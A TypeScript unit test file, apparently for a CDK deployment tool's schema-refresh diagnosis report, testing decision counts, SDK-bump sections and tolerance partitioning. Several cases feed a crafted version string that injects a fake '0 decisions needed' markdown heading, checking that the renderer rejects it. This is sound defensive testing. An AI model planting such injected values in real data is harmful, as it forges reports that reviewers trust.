      'no detail at all',
      'SDK interface `Auth` has no `Member` member, and three others',
      'note: SDK interface `Auth` has no `Member` member',
      'SDK interface Auth has no Member member',
    ]) {
      expect(parseDefinitionMemberMissing(detail), `settled on: ${detail}`).toBeUndefined();
    }
  });
});

describe('countDecisions counts a pending bump per BUMP', () => {
  const pending = (client: string, latest: string, nestedKey: string) => ({
    resourceType: 'AWS::Glue::Connection',
    nestedKey,
    bucket: 'definition-member-missing',
    detail: 'd',
    client,
    installed: '1.0.0',
    latest,
    definition: 'Iface',
    member: nestedKey,
  });

  it('collapses several divergences on one lagging client into one decision', () => {
    const n = countDecisions({
      removed: [],
      divergences: [],
      pendingSdkBump: [
        pending('@aws-sdk/client-glue', '3.1127.0', 'A'),
        pending('@aws-sdk/client-glue', '3.1127.0', 'B'),
        pending('@aws-sdk/client-glue', '3.1127.0', 'C'),
        pending('@aws-sdk/client-glue', '3.1127.0', 'D'),
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
    });
    // go-to-k/cdkd#2784's four became one. Counting per divergence would leave
    // the title's number unchanged and the whole partition pointless.
    expect(n).toBe(1);
  });

  it('counts a separate decision per client, and per version of one client', () => {
    const n = countDecisions({
      removed: [],
      divergences: [],
      pendingSdkBump: [
        pending('@aws-sdk/client-glue', '3.1127.0', 'A'),
        pending('@aws-sdk/client-s3', '3.901.0', 'B'),
        // Same client at a different published version is a different bump —
        // keying on the client alone would silently merge two actions.
        pending('@aws-sdk/client-glue', '3.1200.0', 'C'),
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
    });
    expect(n).toBe(3);
  });

  it('adds to the other kinds rather than replacing them', () => {
    const n = countDecisions({
      removed: [{ resourceType: 'AWS::S3::Bucket', properties: ['Gone'], candidates: {}, sdk: {} }],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [{ resourceType: 'AWS::Glue::Connection', nestedKey: 'K', bucket: 'no-sdk-member', detail: '' }] as any,
      failedChecks: ['property-coverage'],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      pendingSdkBump: [pending('@aws-sdk/client-glue', '3.1127.0', 'A')] as any,
    });
    expect(n).toBe(4);
  });
});

describe('the pending-bump section', () => {
  const PENDING = [
    {
      resourceType: 'AWS::Glue::Connection',
      nestedKey: 'BasicAuthenticationCredentials',
      bucket: 'definition-member-missing',
      detail: 'd',
      client: '@aws-sdk/client-glue',
      installed: '3.1018.0',
      latest: '3.1127.0',
      definition: 'AuthenticationConfiguration',
      member: 'BasicAuthenticationCredentials',
    },
    {
      resourceType: 'AWS::Glue::Connection',
      nestedKey: 'OAuth2Credentials',
      bucket: 'definition-member-missing',
      detail: 'd',
      client: '@aws-sdk/client-glue',
      installed: '3.1018.0',
      latest: '3.1127.0',
      definition: 'OAuth2Properties',
      member: 'OAuth2Credentials',
    },
  ];

  const render = () =>
    renderDiagnosis({
      removed: [],
      divergences: [],
      writableAdded: [],
      skipped: [],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      pendingSdkBump: PENDING as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);

  it('names the bump once and every divergence it resolves', () => {
    const md = render();
    expect(md).toContain('Bump `@aws-sdk/client-glue` from `3.1018.0` to `3.1127.0`');
    expect(md).toContain('Resolves 2 divergences:');
    expect(md).toContain('`AuthenticationConfiguration` declares `BasicAuthenticationCredentials`');
    expect(md).toContain('`OAuth2Properties` declares `OAuth2Credentials`');
    // One heading, not one per finding.
    expect(md.match(/Bump `@aws-sdk\/client-glue`/g)).toHaveLength(1);
  });

  it('counts BUMPS in its own heading, not findings', () => {
    // The heading's number is the one thing a reader totals the sections up
    // from, and the `Dn` fence cannot see it — swapping it for the finding count
    // renders "(2)" over a single label D1 and stays green everywhere else.
    const md = render();
    expect(md).toContain(
      'SDK bumps that resolve nested-key divergences (1) — a decision is needed'
    );
  });

  it('refuses an installed version that is not version-shaped', () => {
    // `installed` is whatever a dependency's own `package.json` says, taken on
    // nothing but `typeof === 'string'` — unlike `client` and `latest`, which
    // are shape-fenced upstream. Every other fixture uses `3.1018.0`, which
    // `renderKey` passes through unchanged, so reverting to raw interpolation
    // survives them all. This is the only case that can tell.
    const md = renderDiagnosis({
      removed: [],
      divergences: [],
      writableAdded: [],
      skipped: [],
      pendingSdkBump: [
        { ...PENDING[0], installed: '3.1.0\n\n### 0 decisions needed — nothing to review\n' },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);
    expect(md).toContain('**[key rejected: unexpected characters]**');
    expect(md).not.toContain('### 0 decisions needed');
  });

  it('says "divergence" for one and "divergences" for two', () => {
    const md = renderDiagnosis({
      removed: [],
      divergences: [],
      writableAdded: [],
      skipped: [],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      pendingSdkBump: [PENDING[0]] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);
    expect(md).toContain('Resolves 1 divergence:');
    expect(md).not.toContain('Resolves 1 divergences:');
  });

  it('orders several bumps deterministically', () => {
    // Two clients and two versions of one of them. Without the sort the section
    // renders in Map-insertion order, which is the order findings happened to
    // arrive — so the same refresh produces a different body run to run and the
    // PR shows a diff with nothing behind it.
    const at = (client: string, latest: string, key: string) => ({
      ...PENDING[0],
      nestedKey: key,
      member: key,
      client,
      latest,
    });
    const md = renderDiagnosis({
      removed: [],
      divergences: [],
      writableAdded: [],
      skipped: [],
      pendingSdkBump: [
        at('@aws-sdk/client-s3', '3.901.0', 'C'),
        at('@aws-sdk/client-glue', '3.1200.0', 'B'),
        at('@aws-sdk/client-glue', '3.1127.0', 'A'),
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);
    const order = [...md.matchAll(/Bump `([^`]+)` from `[^`]+` to `([^`]+)`/g)].map(
      (m) => `${m[1]}@${m[2]}`
    );
    expect(order).toEqual([
      '@aws-sdk/client-glue@3.1127.0',
      '@aws-sdk/client-glue@3.1200.0',
      '@aws-sdk/client-s3@3.901.0',
    ]);
  });

  it('states that the value does not reach AWS until the bump lands', () => {
    // The section is the one place a reader could take "no judgement" for
    // "nothing is wrong". It is a LIVE silent drop at the installed version,
    // which is why it stays in the decision count at all.
    const md = render();
    expect(md).toContain('does not reach AWS');
    expect(md).toContain('silent-drop');
  });

  it('records that the question was interface-scoped, not a name search', () => {
    // The rationale is load-bearing: the next reader deciding whether to relax
    // this test needs to find the measurement that says a name search would
    // have contradicted the checker.
    const md = render();
    expect(md).toContain('not a name search');
  });

  it('renders no section at all when nothing is pending', () => {
    const md = renderDiagnosis({ removed: [], divergences: [], writableAdded: [], skipped: [] });
    expect(md).not.toContain('SDK bumps that resolve');
  });
});

describe('every emitted dependency version is refused when it is not version-shaped', () => {
  // FIVE sites emit a version read out of a dependency's own `package.json`,
  // and each is a separate interpolation: the pending-bump heading, the two lag
  // lines, and the two SDK-evidence arms below. The evidence arms take theirs
  // from `sdkModelsMember`, which does not even `typeof`-check it — weaker than
  // `installed` — and both emit as BARE markdown. Guarding a subset is a guard
  // that looks present and is not: the first cut guarded one of the five, the
  // second three, and a comment claimed completeness at each step.
  const HOSTILE = '3.1.0\n\n### 0 decisions needed — nothing to review\n';

  for (const modelled of [true, false]) {
    it(`refuses it in the SDK-evidence arm (modelled=${modelled})`, () => {
      const md = renderDiagnosis({
        removed: [
          {
            resourceType: 'AWS::S3::Bucket',
            properties: ['Gone'],
            // Shaped like what `collectFixtureDeltas` actually writes: it always
            // sets the `candidates[property]` and `renameCandidates[property]`
            // keys and a `providerPath` key (whose VALUE is undefined when the
            // type maps to no provider file — a separate render arm), and
            // `sdkModelsMember` never returns an empty `consulted`, which would
            // render "across 0 client(s)", a sentence the producer cannot emit.
            candidates: { Gone: [] },
            renameCandidates: { Gone: [] },
            providerPath: 'src/provisioning/providers/s3-bucket-provider.ts',
            sdk: {
              Gone: {
                modelled,
                client: '@aws-sdk/client-s3',
                version: HOSTILE,
                consulted: ['@aws-sdk/client-s3'],
              },
            },
          },
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
        ] as any,
        divergences: [],
        writableAdded: [],
        skipped: [],
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any);
      expect(md).toContain('**[key rejected: unexpected characters]**');
      expect(md).not.toContain('### 0 decisions needed');
    });
  }
});

describe('the divergence procedure and the unknown SDK-lag reading', () => {
  const DIVERGENCE = {
    resourceType: 'AWS::Glue::Connection',
    nestedKey: 'OAuth2Credentials',
    bucket: 'definition-member-missing',
    detail: 'SDK interface `OAuth2Properties` has no `OAuth2Credentials` member',
  };
  /** A SECOND divergence that is NOT unresolved — the discriminator. */
  const SETTLED_NEGATIVE = {
    ...DIVERGENCE,
    nestedKey: 'AuthorizationCodeProperties',
    detail: 'SDK interface `OAuth2Properties` has no `AuthorizationCodeProperties` member',
  };

  // BOTH divergences are always rendered; only the first is unresolved. With a
  // single divergence passed as both lists, a map over `divergences` and a map
  // over `unresolved` produce identical output, so the case could not tell
  // "named the unknown one" from "named every finding" — and naming every
  // finding under "could not settle these" is exactly the confident wrong
  // answer this return value exists to prevent. Same class as the round-1
  // `member === nestedKey` fixture.
  const render = (unresolvedSdkLag: unknown[]) =>
    renderDiagnosis({
      removed: [],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [DIVERGENCE, SETTLED_NEGATIVE] as any,
      writableAdded: [],
      skipped: [],
      unresolvedSdkLag,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);

  // NOT `UNKNOWN, not ruled out`: the pre-existing lag block ends with
  // "its SDK-lag reading is UNKNOWN, not ruled out" for a type whose client
  // could not be read at all, and it renders on this same input. Asserting that
  // phrase made the positive case pass over text this change did not add and
  // the negative case fail for a reason it was not about — caught by the
  // negative arm, which is why both are written.
  const MARKER = 'could not settle these';

  it('refuses a malformed installed version on BOTH lag lines', () => {
    // The `installed` value is unvalidated upstream, and these two lines emit it
    // as BARE markdown — a worse context than the pending-bump heading, which
    // has it in a code span. Both arms are separate interpolations, so a fix
    // applied to one is a guard that looks present and is not; measured, the
    // heading's guard shipped while these two stayed raw.
    const HOSTILE = '3.1.0\n\n### 0 decisions needed — nothing to review\n';
    for (const behind of [true, false]) {
      const md = renderDiagnosis({
        removed: [],
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        divergences: [DIVERGENCE] as any,
        writableAdded: [],
        skipped: [],
        sdkLag: [
          {
            resourceType: 'AWS::Glue::Connection',
            client: '@aws-sdk/client-glue',
            installed: HOSTILE,
            latest: '3.1127.0',
            behind,
            matched: true,
          },
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
        ] as any,
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any);
      expect(md, `behind=${behind}`).toContain('**[key rejected: unexpected characters]**');
      expect(md, `behind=${behind}`).not.toContain('### 0 decisions needed');
    }
  });

  it('claims the SDK-lag reading is settled only for findings it could actually check', () => {
    const md = render([]);
    expect(md).toContain('re-asks that finding’s own');
    expect(md).not.toContain(MARKER);
    // The positive case asserts against the WHOLE document, so moving the
    // explanation into an unconditionally-rendered section would leave both
    // cases green while the conditional render was broken. These pin that the
    // whole block is gated, not just its heading sentence.
    const flat = md.replace(/\s+/g, ' ');
    expect(flat).not.toContain('splits them two ways and no further');
    expect(flat).not.toContain('No rendering of this report is ever rewritten in place');
  });

  it('names the unsettled findings, and only those', () => {
    // The blocking defect this arm exists for: with no such list, a finding
    // reaches the escalation section for two indistinguishable reasons — the
    // published client did not resolve it, or nobody asked. The section's next
    // step is a `NESTED_KEY_ALLOW_LIST` entry, a standing promise that cdkd
    // never sends the value, which must not be reached over a failed download.
    const md = render([DIVERGENCE]);
    expect(md).toContain(MARKER);
    // The line says exactly what a reader can DETERMINE, which is the split the
    // version list can actually make: absent from it, or present and LIVE. Two
    // earlier cuts claimed more — first that the reading was "already ruled
    // out", then that the version line told four causes apart — and both would
    // have walked a maintainer to an allow-list entry on a guess.
    //
    // Asserted against a whitespace-COLLAPSED body: the sentence is assembled
    // from hand-wrapped array literals, so a pure reflow would red substrings
    // that straddle a line break while changing nothing a reader sees.
    const flat = md.replace(/\s+/g, ' ');
    expect(flat).toContain('splits them two ways and no further');
    expect(flat).toContain('this report cannot tell which');
    expect(flat).toContain('Those two are also indistinguishable from here');
    // The refusal of the reading that would have been most costly: an absent
    // type does NOT mean there is nothing to bump.
    expect(flat).toContain('Do NOT read that as “there is nothing to bump”');
    // The remedy, which had no assertion at all and could be deleted green.
    // THREE earlier cuts were wrong, each in the same way — a claim about the
    // workflow, made from another file: "re-run the job" (the fresh reading is
    // computed and discarded on an idle cycle); "the body is only rewritten on
    // a cycle that publishes" (no cycle rewrites it); and "this text was
    // written once, on the day the PR opened" — false read inside a COMMENT,
    // because `divergenceProcedure` takes no destination and this same string
    // is rendered into the body AND into every later comment.
    //
    // So the wording must hold from either destination, which is what these
    // pin. The mechanism sentence is asserted, not just the imperative: all
    // three wrong versions kept a plausible imperative. The workflow behaviour
    // it rests on is fenced separately, in
    // `tests/unit/scripts/cfn-schema-refresh-workflow.test.ts`.
    expect(flat).toContain('No rendering of this report is ever rewritten in place');
    expect(flat).toContain('the newest comment holds the newest reading POSTED');
    // Not the newest reading TAKEN — an idle cycle recomputes and discards one,
    // so "it is current" claimed more than the mechanism supports.
    expect(flat).toContain('not necessarily the newest one taken');
    expect(flat).toContain('If there is no comment, the body is all there is');
    expect(flat).toContain('npm view @aws-sdk/client-<service> version');
    // Nothing may claim WHERE this particular instance is being read.
    expect(flat).not.toContain('written once, on the day');
    // The finding itself is named, not just the class...
    expect(md).toContain('   - `AWS::Glue::Connection`: `OAuth2Credentials`');
    // ...and the OTHER divergence, which the published client DID settle, is
    // not swept in with it. It still appears in the findings list above, so the
    // assertion is on the unsettled listing's own line shape.
    expect(md).not.toContain('   - `AWS::Glue::Connection`: `AuthorizationCodeProperties`');
    expect(md).toContain('AuthorizationCodeProperties');
  });
});

describe('partitionSettledRemovals (issue #3005)', () => {
  /**
   * One tolerance map serving every case, holding a settled property and NOT
   * holding a sibling. Every assertion therefore carries its own control: a
   * partition that settled everything, or nothing, fails at least one arm of
   * each case rather than passing half of them.
   */
  const TOLERANCE = {
    'AWS::SQS::Queue': { ContentBasedDeduplication: 'settled on an earlier cycle' },
    'AWS::Logs::LogGroup': { LogGroupClass: 'a second type, to catch per-entry cross-talk' },
  };
  const entry = (resourceType: string, properties: string[]) => ({
    resourceType,
    properties,
    candidates: {},
  });

  it('subtracts a property the tolerance file ALREADY settles — the counted-but-green case', () => {
    // The defect: `writeAutoTolerated` SKIPS an already-tolerated property, so
    // it reaches neither `written` nor `escalated`, and subtracting `written`
    // alone left it in the count while `property-coverage` stayed green. The PR
    // was titled "1 decision needed" with no check red and nothing to do.
    const { remaining, settled } = partitionSettledRemovals(
      [entry('AWS::SQS::Queue', ['ContentBasedDeduplication'])],
      TOLERANCE
    );
    expect(remaining).toEqual([]);
    expect(countDecisions({ removed: remaining, divergences: [] })).toBe(0);
    // And it is still VISIBLE. Trading a wrong decision for an invisible
    // removal is the regression the two-half return exists to prevent.
    expect(settled).toEqual([
      {
        resourceType: 'AWS::SQS::Queue',
        property: 'ContentBasedDeduplication',
        rationale: 'settled on an earlier cycle',
      },
    ]);
  });

  it('KEEPS a removal the tolerance file does not settle, and reports it as settling nothing', () => {
    // The discriminating control: without it, a partition that settled
    // everything would pass the case above, and the count could never report a
    // real removal again.
    const removed = [entry('AWS::SQS::Queue', ['CdkdNotToleratedName'])];
    const { remaining, settled } = partitionSettledRemovals(removed, TOLERANCE);
    expect(remaining).toEqual(removed);
    expect(settled).toEqual([]);
    expect(countDecisions({ removed: remaining, divergences: [] })).toBe(1);
  });

  it('keeps only the unsettled properties of a mixed entry, and preserves its other fields', () => {
    const { remaining, settled } = partitionSettledRemovals(
      [
        {
          resourceType: 'AWS::SQS::Queue',
          properties: ['ContentBasedDeduplication', 'CdkdNotToleratedName'],
          candidates: { CdkdNotToleratedName: ['CdkdRenameCandidate'] },
        },
      ],
      TOLERANCE
    );
    expect(remaining).toEqual([
      {
        resourceType: 'AWS::SQS::Queue',
        properties: ['CdkdNotToleratedName'],
        candidates: { CdkdNotToleratedName: ['CdkdRenameCandidate'] },
      },
    ]);
    expect(settled.map((s) => s.property)).toEqual(['ContentBasedDeduplication']);
  });

  it('drops one entry and keeps its sibling, per TYPE, without cross-talk', () => {
    // Two entries in one call: per-entry independence, order preservation, and
    // the emptied-row drop, none of which a single-element array can show.
    // `countDecisions` counts ENTRIES, so an emptied row left in place would
    // still count 1 — the defect surviving its own fix.
    const { remaining, settled } = partitionSettledRemovals(
      [
        entry('AWS::SQS::Queue', ['ContentBasedDeduplication']),
        entry('AWS::Logs::LogGroup', ['CdkdNotToleratedName']),
        entry('AWS::SNS::Topic', ['ContentBasedDeduplication']),
      ],
      TOLERANCE
    );
    // The SNS entry survives although its property name is settled under a
    // DIFFERENT type — the lookup is per type, not per name.
    expect(remaining.map((e) => e.resourceType)).toEqual(['AWS::Logs::LogGroup', 'AWS::SNS::Topic']);
    expect(countDecisions({ removed: remaining, divergences: [] })).toBe(2);
    expect(settled).toEqual([
      {
        resourceType: 'AWS::SQS::Queue',
        property: 'ContentBasedDeduplication',
        rationale: 'settled on an earlier cycle',
      },
    ]);
  });

  it('settles nothing when the tolerance map is absent or empty — the safe direction', () => {
    // An unreadable or missing tolerance file must OVER-count, never under: a
    // decision wrongly shown is a wasted read, a decision wrongly hidden is the
    // silent merge this whole issue is about. `main()` falls back to `{}` on an
    // unparseable file for exactly this reason.
    const removed = [entry('AWS::SQS::Queue', ['ContentBasedDeduplication'])];
    for (const empty of [undefined, {}, { 'AWS::SQS::Queue': {} }]) {
      const { remaining, settled } = partitionSettledRemovals(removed, empty);
      expect(remaining).toEqual(removed);
      expect(settled).toEqual([]);
    }
  });

  it('agrees with classifyCoverage about what SETTLED means, both ways', () => {
    // The confluence the defect broke: `classifyCoverage` decides `bogus`
    // membership from `bogusTolerated`, and the count decided it from this
    // cycle's `written` list. Two definitions of one word is what let a counted
    // decision sit next to a green check, so this pins them to ONE input — and
    // asserts BOTH polarities, since agreeing only on the settled side is also
    // satisfied by a partition that settles everything.
    const schemaProperties = ['QueueName']; // both names have LEFT the schema
    const handledProperties = new Set([
      'QueueName',
      'ContentBasedDeduplication',
      'CdkdNotToleratedName',
    ]);
    for (const property of ['ContentBasedDeduplication', 'CdkdNotToleratedName']) {
      const coverage = classifyCoverage({
        resourceType: 'AWS::SQS::Queue',
        schemaProperties,
        readOnlyProperties: [],
        handledProperties,
        unhandledByDesign: undefined,
        backfillProperties: undefined,
        bogusTolerated: TOLERANCE['AWS::SQS::Queue'],
      });
      const ciWouldBeRed = coverage.bogus.some((b) => b.endsWith(`:${property}`));
      const counted =
        partitionSettledRemovals([entry('AWS::SQS::Queue', [property])], TOLERANCE).remaining
          .length > 0;
      expect(
        counted,
        `${property}: the count says ${counted ? 'decision' : 'settled'} while property-coverage ` +
          `would be ${ciWouldBeRed ? 'RED' : 'GREEN'} — the two must agree, or a counted decision ` +
          'merges on a green check (issue #3005)'
      ).toBe(ciWouldBeRed);
    }
  });

  it('renders a standing-tolerance removal instead of dropping it from the report', () => {
    // The regression the two-half return closes. Subtracting alone made the
    // removal render NOWHERE — `writeAutoTolerated` skipped it, so it earns no
    // "the job settled this" entry either — and the body then said "additions
    // only" over a property AWS had removed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      skipped: [],
      divergences: [],
      alreadyTolerated: [
        {
          resourceType: 'AWS::SQS::Queue',
          property: 'ContentBasedDeduplication',
          rationale: 'settled on an earlier cycle',
        },
      ],
    });
    expect(md).toContain('a STANDING tolerance already settles (1)');
    expect(md).toContain('ContentBasedDeduplication');
    expect(md).toContain('settled on an earlier cycle');
    // Still a zero-decision report, and the opening sentence must not claim
    // something the section below contradicts.
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(md).not.toContain('additions only');
  });

  it('does not say "additions only" when THIS run settled the removal either', () => {
    // The sibling of the case above, and the one the first fix missed: keying
    // the sentence on `alreadyTolerated` alone left it contradicting the
    // job-settled section, which the 73%-auto-settleable figure makes the
    // common path rather than the rare one.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      skipped: [],
      divergences: [],
      autoTolerated: [
        {
          resourceType: 'AWS::Route53::RecordSet',
          property: 'GeoProximityLocation',
          rationale: 'settled by the job',
        },
      ],
    });
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(md).not.toContain('additions only');
    expect(md).toContain('the job SETTLED itself (1)');
  });

  it('still says "additions only" when nothing was removed at all', () => {
    // The control for the case above: without it, deleting the conditional and
    // always using the longer sentence would pass.
    const md = renderDiagnosis({ removed: [], writableAdded: [], skipped: [], divergences: [] });
    expect(md).toContain('Nothing in this refresh needs a decision — additions only.');
    expect(md).not.toContain('a STANDING tolerance already settles');
  });
});

describe('partitionSettledRemovals vs the job’s own writes (issue #3005)', () => {
  // The Settle step runs BEFORE Diagnose and writes into the very file the
  // diagnosis then reads, so `bogusTolerated` already carries this cycle's
  // entries. Without `settledThisCycle` every auto-settled property lands in
  // BOTH report sections, the second under prose asserting an earlier cycle
  // wrote it — and that is the designed happy path, not a corner.
  //
  // The fixture is deliberately NOT four unrelated pairs. The subtraction is a
  // CONJUNCTION (`w.resourceType === e.resourceType && w.property === p`), and
  // over pairwise-distinct data either half alone decides every case, so each
  // conjunct is individually deletable with the suite green. Two of the four
  // entries exist only to discriminate: `HealthCheckId` shares its TYPE with
  // the write (dropping the property test would wrongly exclude it), and
  // `AWS::EC2::Instance.GeoProximityLocation` shares its PROPERTY NAME with the
  // write (dropping the type test would wrongly exclude that one).
  const TOLERANCE = {
    'AWS::Route53::RecordSet': {
      GeoProximityLocation: 'written by THIS run',
      HealthCheckId: 'standing, and shares its TYPE with this run’s write',
    },
    'AWS::AutoScaling::AutoScalingGroup': { DefaultCooldown: 'written long ago' },
    'AWS::EC2::Instance': {
      GeoProximityLocation: 'standing, and shares its PROPERTY NAME with this run’s write',
    },
  };
  const WRITTEN_THIS_CYCLE = [
    { resourceType: 'AWS::Route53::RecordSet', property: 'GeoProximityLocation' },
  ];
  const removed = [
    {
      resourceType: 'AWS::Route53::RecordSet',
      properties: ['GeoProximityLocation', 'HealthCheckId'],
      candidates: {},
    },
    {
      resourceType: 'AWS::AutoScaling::AutoScalingGroup',
      properties: ['DefaultCooldown'],
      candidates: {},
    },
    { resourceType: 'AWS::EC2::Instance', properties: ['GeoProximityLocation'], candidates: {} },
  ];

  it('leaves this run’s OWN writes out of the standing-tolerance list', () => {
    const { remaining, settled } = partitionSettledRemovals(
      removed,
      TOLERANCE,
      WRITTEN_THIS_CYCLE
    );
    // Both are settled, so neither is counted...
    expect(remaining).toEqual([]);
    expect(countDecisions({ removed: remaining, divergences: [] })).toBe(0);
    // ...but only the one nobody wrote this cycle is attributed to a STANDING
    // entry. The other already has its own section.
    expect(settled.map((s) => `${s.resourceType}.${s.property}`)).toEqual([
      'AWS::Route53::RecordSet.HealthCheckId',
      'AWS::AutoScaling::AutoScalingGroup.DefaultCooldown',
      'AWS::EC2::Instance.GeoProximityLocation',
    ]);
  });

  it('claims BOTH when nothing was written this cycle — the discriminating control', () => {
    // Without this, dropping every property from `settled` would pass the case
    // above and silently restore "the removal renders nowhere".
    const { settled } = partitionSettledRemovals(removed, TOLERANCE);
    expect(settled.map((s) => `${s.resourceType}.${s.property}`)).toEqual([
      'AWS::Route53::RecordSet.GeoProximityLocation',
      'AWS::Route53::RecordSet.HealthCheckId',
      'AWS::AutoScaling::AutoScalingGroup.DefaultCooldown',
      'AWS::EC2::Instance.GeoProximityLocation',
    ]);
  });

  it('refuses a NON-STRING rationale rather than killing the report', () => {
    // `_todo-backfill.json` is hand-edited by design and `classifyCoverage`
    // reads only `Object.keys`, so a `"Prop": null` typo is GREEN on CI. If it
    // reached the report, `renderDetail` would call `.replace` on it and the
    // diagnosis would die before anything was written — the exact outcome the
    // tolerance-read try/catch exists to prevent, one layer in. Unsettled is
    // the safe verdict: the property stays counted.
    for (const bad of [null, 42, { why: 'an object' }, ['a list']]) {
      const tolerance = { 'AWS::EC2::Instance': { Tenancy: bad } } as unknown as Parameters<
        typeof partitionSettledRemovals
      >[1];
      const entries = [
        { resourceType: 'AWS::EC2::Instance', properties: ['Tenancy'], candidates: {} },
      ];
      const { remaining, settled } = partitionSettledRemovals(entries, tolerance);
      expect(settled, `a ${typeof bad} rationale was treated as a settlement`).toEqual([]);
      expect(countDecisions({ removed: remaining, divergences: [] })).toBe(1);
      // ...and the report still renders, which is the half a bare "not settled"
      // assertion cannot see.
      expect(() =>
        renderDiagnosis({
          removed: remaining,
          writableAdded: [],
          skipped: [],
          divergences: [],
        })
      ).not.toThrow();
    }
  });

  it('renders each settled property in exactly ONE section', () => {
    // Its own minimal pair: the discriminating fixture above deliberately
    // repeats `GeoProximityLocation` across two types, which would make the
    // per-name occurrence counts below say nothing about double-rendering.
    const { settled } = partitionSettledRemovals(
      [
        {
          resourceType: 'AWS::Route53::RecordSet',
          properties: ['GeoProximityLocation'],
          candidates: {},
        },
        {
          resourceType: 'AWS::AutoScaling::AutoScalingGroup',
          properties: ['DefaultCooldown'],
          candidates: {},
        },
      ],
      TOLERANCE,
      WRITTEN_THIS_CYCLE
    );
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      skipped: [],
      divergences: [],
      autoTolerated: [
        {
          resourceType: 'AWS::Route53::RecordSet',
          property: 'GeoProximityLocation',
          rationale: 'written by THIS run',
        },
      ],
      alreadyTolerated: settled,
    });
    // The section headings must not both count it, and the property name must
    // appear once per section it legitimately belongs to — `GeoProximityLocation`
    // only under the job-settled heading.
    expect(md).toContain('the job SETTLED itself (1)');
    expect(md).toContain('a STANDING tolerance already settles (1)');
    expect((md.match(/GeoProximityLocation/g) ?? []).length).toBe(1);
    expect((md.match(/DefaultCooldown/g) ?? []).length).toBe(1);
  });
});

describe('main()’s tolerance read (issue #3005)', () => {
  const SCRIPT_PATH = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');

  it('resolves the tolerance file to the SAME path its writer and CI use', () => {
    // A SOURCE-shape assertion, and the reason is worth stating rather than
    // hiding behind a weaker test: the behaviour is not reachable at runtime.
    // Measured 2026-09-12, a `--fixtures-dir` run reports all 134 fixtures
    // "could not read" -- `committedOf` follows the seam too and git cannot
    // resolve a path outside the repository -- so `removed` is empty there and
    // the tolerance map is never consulted for a subtraction. A spawn case
    // would pass with any spelling, which is the vacuous green this suite
    // refuses.
    //
    // What is pinned is that the THREE readers name one file. The map became
    // the whole subtraction oracle in go-to-k/cdkd#3005, and "settled" meaning
    // different things in different places is the defect that issue turned out
    // to carry. Pointing this read at the `--fixtures-dir` seam was tried and
    // reverted: `writeAutoTolerated` takes a `repoRoot` seam and is called with
    // the default, so the seam would have had the Settle step write one file
    // while the diagnosis read another.
    const source = readFileSync(SCRIPT_PATH, 'utf8');
    expect(
      source,
      'the diagnosis no longer resolves the tolerance file the way its writer does'
    ).toContain("const tolerancePath = join(REPO_ROOT, 'tests/fixtures/cfn-schemas/_todo-backfill.json');");
    // The writer's own spelling, so a change to either side fails here rather
    // than letting the two drift apart silently.
    expect(
      source,
      'writeAutoTolerated no longer resolves the tolerance file the way the diagnosis does'
    ).toContain("const path = join(repoRoot, 'tests/fixtures/cfn-schemas/_todo-backfill.json');");
    // ...and the writer is still called WITHOUT a repoRoot override, which is
    // what makes the two resolve equal on every real run.
    expect(source).toContain('writeAutoTolerated(removed, providerFiles)');
  });

  // The `try/catch` around that read has NO case, and the absence is recorded
  // rather than papered over with one that asserts nothing. A spawn case was
  // written and then withdrawn: it wrote a broken `_todo-backfill.json` into a
  // `--fixtures-dir` scratch tree, which the diagnosis does not read — the path
  // is `REPO_ROOT`-fixed, deliberately, so all three readers name one file.
  // Probed after that was settled: removing the wrap left the suite green, so
  // the case was measuring nothing. Reaching the catch needs the COMMITTED
  // tolerance file to be unparseable, and this suite's own convention refuses a
  // case that writes to it (`withScratchRoot` asserts its bytes are unchanged).
  // What the wrap buys is stated at the call site instead.
});
